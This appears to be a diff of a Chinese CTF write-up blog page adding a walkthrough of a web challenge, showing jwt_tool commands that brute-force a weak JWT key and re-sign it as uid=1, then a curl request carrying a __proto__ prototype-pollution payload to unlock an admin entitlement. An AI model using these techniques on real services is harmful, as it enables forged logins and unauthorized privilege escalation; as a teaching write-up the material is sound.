@@ -2257,6 +2257,8 @@
       
         
       
+        
+      
     
     
     
@@ -3094,6 +3096,36 @@
   
   
     <li class="md-nav__item">
+      <a href="category/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    原型链污染
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
         
   
@@ -3626,6 +3658,245 @@
 </span></code></pre></div>
 <p>重点不是"这题用了什么 payload"，而是<strong>"我是怎么判断出该用这个的"</strong>。</p>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-11-23 13:30:00+00:00">2026-11-23</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/web/" class="md-meta__link">Web</a>, 
+              <a href="category/jwt/" class="md-meta__link">JWT</a>, 
+              <a href="category/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="md-meta__link">原型链污染</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="jwt-uid1-entitlement"><a class="toclink" href="geek2019-garlic-vault/">[极客大挑战] 大蒜哥 — JWT 换成 uid=1，再往原型上塞一个 entitlement</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：JWT 伪造（弱密钥）+ 原型链污染</p>
+<p><strong>Flag</strong>：<code>SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="geek2019-garlic-vault/#_1">题目概述</a></h3>
+<p>注册登录后是个“游戏库”页面。<strong>表面上是点卡片启动游戏，实际上真相全在 <code>app.js</code> 里。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="geek2019-garlic-vault/#_2">解题过程</a></h3>
+<h4 id="step-1-token"><a class="toclink" href="geek2019-garlic-vault/#step-1-token">Step 1：先看 token 存在哪</a></h4>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">TOKEN_KEY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"garlic_vault_token"</span><span class="p">;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="kd">function</span><span class="w"> </span><span class="nx">token</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="nx">TOKEN_KEY</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">""</span><span class="p">;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>JWT 存在 <code>localStorage</code>，键名是 <code>garlic_vault_token</code>。</strong></p>
+<p><strong>控制台里直接看：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s2">"garlic_vault_token"</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>拿到 token 之后，再看它是怎么发出去的：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{})</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...(</span><span class="nx">options</span><span class="p">.</span><span class="nx">headers</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">{})</span><span class="w"> </span><span class="p">};</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">token</span><span class="p">())</span><span class="w"> </span><span class="nx">headers</span><span class="p">.</span><span class="nx">Authorization</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`Bearer </span><span class="si">${</span><span class="nx">token</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="nx">options</span><span class="p">,</span><span class="w"> </span><span class="nx">headers</span><span class="w"> </span><span class="p">});</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">().</span><span class="k">catch</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({}));</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span><span class="w"> </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"服务器暂时没有响应"</span><span class="p">);</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>所有请求都自动带上 <code>Authorization: Bearer &lt;token&gt;</code>。</strong></p>
+<p><strong>所以只要能改 token 内容，就能以任意身份调用接口。</strong></p>
+<h4 id="step-2"><a class="toclink" href="geek2019-garlic-vault/#step-2">Step 2：代码里直接告诉你该改什么</a></h4>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">loadVault</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="s2">"/api/vault"</span><span class="p">);</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">mode</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"owner"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">      </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="s2">"/api/admin/games"</span><span class="p">);</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="nx">loadOwnerPanel</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">consoleScript</span><span class="p">);</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">renderVisitor</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">username</span><span class="p">);</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">renderLogin</span><span class="p">();</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="p">}</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="c1">// OWNER PROFILE // GARLIC #001</span>
+</span></code></pre></div>
+<p><strong>两个关键信息：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>state.mode === "owner"  → 才会调 /api/admin/games
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>// OWNER PROFILE // GARLIC #001   → 管理员是 #001，也就是 uid = 1
+</span></code></pre></div>
+<p><strong>所以目标是：把 JWT 里的 <code>uid</code> 改成 1。</strong></p>
+<h4 id="step-3-token"><a class="toclink" href="geek2019-garlic-vault/#step-3-token">Step 3：解 token，确认字段</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">cd </span><span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">tools</span><span class="p">\</span><span class="n">jwt_tool</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span>
+</span></code></pre></div>
+<p><strong>解出来：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>username = "12"
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>uid      = 2333
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>iat      = 1795410143
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>exp      = 1795417343
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>iss      = "garlic-private-server"
+</span></code></pre></div>
+<p><strong><code>uid: 2333</code> 是普通用户，要改成 <code>1</code>。</strong></p>
+<h4 id="step-4"><a class="toclink" href="geek2019-garlic-vault/#step-4">Step 4：爆破签名密钥</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span> <span class="n">-C</span> <span class="n">-d</span> <span class="s2">"C:\Users\崔路宽\Desktop\dict.txt"</span>
+</span></code></pre></div>
+<p><strong>爆破结果：<code>123123</code></strong></p>
+<p><strong>（这类题密钥几乎一定是纯数字或常见词，小字典跑几十秒就出。）</strong></p>
+<h4 id="step-5-uid1"><a class="toclink" href="geek2019-garlic-vault/#step-5-uid1">Step 5：用密钥重签 uid=1</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;你的token&gt;"</span> <span class="n">-I</span> <span class="n">-pc</span> <span class="n">uid</span> <span class="n">-pv</span> <span class="n">1</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="n">123123</span>
+</span></code></pre></div>
+<p><strong>得到的 payload 形如：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="p">{</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"12"</span><span class="p">,</span><span class="nt">"uid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"iat"</span><span class="p">:</span><span class="mi">1795410143</span><span class="p">,</span><span class="nt">"exp"</span><span class="p">:</span><span class="mi">1795417343</span><span class="p">,</span><span class="nt">"iss"</span><span class="p">:</span><span class="s2">"garlic-private-server"</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>把新 token 写回 localStorage，然后刷新页面：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s2">"garlic_vault_token"</span><span class="p">,</span><span class="w"> </span><span class="s2">"&lt;新token&gt;"</span><span class="p">)</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">()</span>
+</span></code></pre></div>
+<p><strong>刷新后 <code>state.mode</code> 变成 <code>owner</code>，自动进入管理员面板。</strong></p>
+<h4 id="step-6"><a class="toclink" href="geek2019-garlic-vault/#step-6">Step 6：面板里的按钮全是装饰</a></h4>
+<p><strong>进去之后点卡片没反应。</strong>打开网络面板看，<strong>按钮只改了页面上的一行字，根本没发请求。</strong></p>
+<p><strong>真正有用的只有一段代码：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gta6Endpoint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"/api/admin/gta6/launch"</span><span class="p">;</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">gta6Entitlement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"gta6_play"</span><span class="p">;</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">bootGta6</span><span class="p">(</span><span class="nx">app</span><span class="p">,</span><span class="w"> </span><span class="nx">api</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">api</span><span class="p">(</span><span class="nx">gta6Endpoint</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s2">"POST"</span><span class="p">,</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s2">"Content-Type"</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/json"</span><span class="w"> </span><span class="p">},</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="w"> </span><span class="nx">game</span><span class="o">:</span><span class="w"> </span><span class="s2">"gta6"</span><span class="p">,</span><span class="w"> </span><span class="nx">settings</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">quality</span><span class="o">:</span><span class="w"> </span><span class="s2">"ultra"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">})</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="w">  </span><span class="p">});</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="w">  </span><span class="nx">output</span><span class="p">.</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">flag</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"GTA6 已启动。"</span><span class="p">;</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>注意这两个常量：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>端点          POST /api/admin/gta6/launch
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>权限标识      gta6_play   ← 后端就是看这个
+</span></code></pre></div>
+<p><strong>正常情况下用户没有 <code>gta6_play</code> 这个权限，所以拿不到 flag。</strong></p>
+<h4 id="step-7"><a class="toclink" href="geek2019-garlic-vault/#step-7">Step 7：用原型链污染伪造权限</a></h4>
+<p><strong>把请求体里的 <code>settings</code> 换掉，让 <code>gta6_play</code> 出现在</strong>原型链<strong>上：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">{</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span><span class="nt">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"gta6"</span><span class="p">,</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span><span class="nt">"settings"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"gta6_play"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>为什么这样能过：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>后端大概率做了把 settings 合并进某个对象（Object.assign / 展开）的动作
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>合并时 __proto__ 会把 gta6_play 挂到 Object.prototype 上
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>之后任何对象查 gta6_play 都会命中 → 权限判断通过
+</span></code></pre></div>
+<p><strong>这就是原型链污染：</strong>你没有那个字段，但你的<strong>原型</strong>有。**</p>
+<p><strong>拿 flag 的请求：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="s2">"http://目标/api/admin/gta6/launch"</span> <span class="p">`</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>  <span class="n">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="p">`</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>  <span class="n">-H</span> <span class="s2">"Authorization: Bearer &lt;uid=1的token&gt;"</span> <span class="p">`</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>  <span class="n">-d</span> <span class="s1">'{\"game\":\"gta6\",\"settings\":{\"__proto__\":{\"gta6_play\":true}}}'</span>
+</span></code></pre></div>
+<p><strong>返回里的 <code>flag</code> 字段就是答案：</strong></p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">{</span><span class="nt">"unlocked"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">"title"</span><span class="p">:</span><span class="s2">"一男一女 / GTA6"</span><span class="p">,</span><span class="nt">"flag"</span><span class="p">:</span><span class="s2">"SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}"</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong><code>unlocked: true</code> 这一项就是被污染出来的权限——原本用户并没有 <code>gta6_play</code>。</strong></p>
+<hr />
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>关键点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>token 位置</td>
+<td><code>localStorage["garlic_vault_token"]</code></td>
+</tr>
+<tr>
+<td>发送方式</td>
+<td>每个请求自动加 <code>Authorization: Bearer</code></td>
+</tr>
+<tr>
+<td>身份判断</td>
+<td><code>state.mode === "owner"</code> 才进管理面板</td>
+</tr>
+<tr>
+<td>改名线索</td>
+<td>注释 <code>// OWNER PROFILE // GARLIC #001</code> → uid=1</td>
+</tr>
+<tr>
+<td>密钥</td>
+<td>爆破得 <code>123123</code></td>
+</tr>
+<tr>
+<td>重签</td>
+<td>只改 <code>uid</code>，其他字段原样保留</td>
+</tr>
+<tr>
+<td>按钮无效</td>
+<td>纯前端装饰，真正接口是 <code>/api/admin/gta6/launch</code></td>
+</tr>
+<tr>
+<td>权限标识</td>
+<td><code>gta6_play</code>（前端常量名 <code>gta6Entitlement</code>）</td>
+</tr>
+<tr>
+<td>污染点</td>
+<td><code>settings</code> 里的 <code>__proto__</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整流程</summary>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c"># ① 看 token</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="c"># 浏览器控制台：localStorage.getItem("garlic_vault_token")</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="c"># ② 解析 + 爆破</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;token&gt;"</span> <span class="n">-C</span> <span class="n">-d</span> <span class="n">dict</span><span class="p">.</span><span class="n">txt</span>        <span class="c"># → 123123</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="c"># ③ 重签 uid=1</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="n">python</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s2">"&lt;token&gt;"</span> <span class="n">-I</span> <span class="n">-pc</span> <span class="n">uid</span> <span class="n">-pv</span> <span class="n">1</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="n">123123</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="c"># ④ 写回并刷新</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="c"># localStorage.setItem("garlic_vault_token","&lt;新token&gt;"); location.reload()</span>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="c"># ⑤ 原型链污染拿 flag</span>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-X</span> <span class="n">POST</span> <span class="s2">"http://目标/api/admin/gta6/launch"</span> <span class="p">`</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>  <span class="n">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="p">`</span>
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>  <span class="n">-H</span> <span class="s2">"Authorization: Bearer &lt;新token&gt;"</span> <span class="p">`</span>
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>  <span class="n">-d</span> <span class="s1">'{"game":"gta6","settings":{"__proto__":{"gta6_play":true}}}'</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 进了面板就到处点</strong></p>
+<p><strong>卡片是纯前端装饰</strong>，点了只改页面文字。<strong>真正的价值在“网络”面板里那条 <code>console-script</code> / <code>gta6/launch</code> 请求。</strong></p>
+<p><strong>② 以为改了 uid 就能直接拿 flag</strong></p>
+<p><strong>uid=1 只给你“进门”的资格</strong>，<code>gta6_play</code> 这个权限还得自己造——<strong>这才是这题的第二个考点。</strong></p>
+<p><strong>③ 重签时把 iat/exp 写死成旧值</strong></p>
+<p><strong>token 有有效期</strong>，改签时最好把 <code>iat</code>/<code>exp</code> 更新到当前时间，否则改完还是过期。</p>
+<p><strong>④ <code>__proto__</code> 拼错</strong></p>
+<p>是<strong>两个下划线</strong>：<code>__proto__</code>。写成 <code>__potor__</code> 之类的，服务端只会把它当成一个普通字段，什么都不会发生。</p>
+</details>
+    
